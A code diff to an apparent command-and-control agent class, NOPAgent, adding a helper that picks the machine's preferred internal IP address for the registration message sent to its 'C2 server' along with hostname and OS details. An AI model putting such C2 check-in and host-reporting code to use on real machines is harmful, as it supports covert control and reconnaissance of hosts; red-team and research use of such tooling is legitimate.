@@ -157,6 +157,33 @@ class NOPAgent:
     async def noop(self):
         """No-op for disabled modules"""
         pass
+    def get_best_ip(self):
+        """Get best IP address, preferring internal networks (10.x, 192.168.x) over Docker"""
+        try:
+            import netifaces
+            best_ip = None
+            fallback_ip = None
+            
+            for iface in netifaces.interfaces():
+                if iface == 'lo':
+                    continue
+                addrs = netifaces.ifaddresses(iface)
+                if netifaces.AF_INET in addrs:
+                    for addr in addrs[netifaces.AF_INET]:
+                        ip = addr.get('addr')
+                        if ip:
+                            # Prefer 10.x or 192.168.x networks
+                            if ip.startswith('10.') or ip.startswith('192.168.'):
+                                best_ip = ip
+                                break
+                            elif not fallback_ip:
+                                fallback_ip = ip
+                if best_ip:
+                    break
+            
+            return best_ip or fallback_ip or socket.gethostbyname(socket.gethostname())
+        except Exception:
+            return socket.gethostbyname(socket.gethostname())
         
     async def register(self):
         """Register agent with C2 server"""
@@ -169,7 +196,7 @@ class NOPAgent:
                 "hostname": socket.gethostname(),
                 "platform": platform.system(),
                 "version": platform.version(),
-                "ip_address": socket.gethostbyname(socket.gethostname())
+                "ip_address": self.get_best_ip()
             }
         }
         await self.ws.send(json.dumps(registration))
